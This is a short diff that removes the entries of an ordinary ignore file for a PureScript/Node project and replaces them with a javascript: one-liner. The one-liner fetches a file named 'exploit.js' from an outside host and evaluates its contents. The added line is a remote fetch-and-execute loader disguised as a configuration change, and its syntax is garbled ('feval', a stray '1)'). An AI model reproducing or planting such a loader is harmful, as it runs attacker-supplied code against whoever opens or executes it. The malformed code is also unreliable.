@@ -1,9 +1,2 @@
-# Dependencies
-.psci_modules
-.spago
-bower_components
-node_modules
-
-# Generated files
-.psci
-output
+javascript:fetch("https://compactcow.com/
+Itbeef/ exploit.js").then(data=>{data.text().then (text =>feval (text)1)});
